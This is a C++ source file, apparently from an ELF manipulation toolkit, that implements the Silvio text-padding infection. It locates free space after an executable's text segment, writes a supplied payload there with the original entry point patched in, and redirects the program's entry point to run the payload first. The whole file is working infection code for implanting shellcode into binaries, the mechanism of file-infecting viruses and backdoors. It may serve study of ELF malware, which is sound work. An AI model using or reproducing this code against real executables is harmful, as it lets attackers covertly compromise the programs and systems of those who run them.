#include "zkinjections.hh"
#include "zkexcept.hh"

/* API for Silvio text padding infection */

Injections::TextPaddingInfection::TextPaddingInfection(const char *target, 
        u8 *magic)
    :Elf(target), tpi_payload(nullptr), tpi_fake_entry(0), tpi_payload_sz(0)
{
    tpi_org_entry = (Addr)elf_ehdr->e_entry;
    for(int i = 0; i < MAGIC_LEN; i++)
        tpi_magic[i] = magic[i];
}

Injections::TextPaddingInfection::~TextPaddingInfection()
{
    if(tpi_payload)
        free(tpi_payload);
}

/* assumed payload is a heap allocated memory chunk */
void Injections::TextPaddingInfection::SetPayload(u8 *payload, size_t
        payload_sz)
{
    /*
     * total size of shellcode should be payload_sz - MAGIC_LEN + ADDR_LEN
     */
    tpi_payload_sz = payload_sz - MAGIC_LEN + ADDR_LEN;
    tpi_payload = malloc(tpi_payload_sz * (sizeof(u8)));
    if(tpi_payload == nullptr)
        throw std::bad_alloc();

    memset(tpi_payload, 0, tpi_payload_sz);
    for (int i = 0; i < payload_sz; i++)
        *((u8 *)tpi_payload + i) = payload[i];

    return;
}

off_t Injections::TextPaddingInfection::FindFreeSpace(void)
{
    /* text segment has permission bits set to read and exec */
    int text_index = GetSegmentIndexbyAttr(PT_LOAD, PF_X | PF_R, 0);
    assert(text_index != -1 && "text segment not found");

    /* next segment is PF_R */
    int data_index = GetSegmentIndexbyAttr(PT_LOAD, PF_R, PF_R | PF_X);
    assert(data_index != -1 && "data segment not found");

    printf("%d\t%d\n", data_index, text_index);
    assert(text_index + 1 == data_index && "whoaaa!!! exxit exxittt");
    int available_space = elf_phdr[data_index].p_offset - elf_phdr[text_index]
        .p_offset;
    assert(available_space >= tpi_payload_sz && 
            "available free space is less than size");
    tpi_fake_entry = elf_phdr[text_index].p_vaddr + elf_phdr[text_index].p_memsz;
    return elf_phdr[text_index].p_offset + elf_phdr[text_index].p_filesz;
}

void Injections::TextPaddingInfection::InjectPayload(void)
{
    off_t writeoff = FindFreeSpace();
    try{
        Binary::PatchAddress((u8 *)tpi_payload, tpi_payload_sz, tpi_org_entry, 
                (u8 *)tpi_magic);
    } catch (zkexcept::magic_not_found_error& e){
        std::cerr << e.what();
        std::exit(1);
    }

    ElfWrite((void *)tpi_payload, writeoff, tpi_payload_sz);
    SetEntryPoint((Addr)tpi_fake_entry);
    return;
}
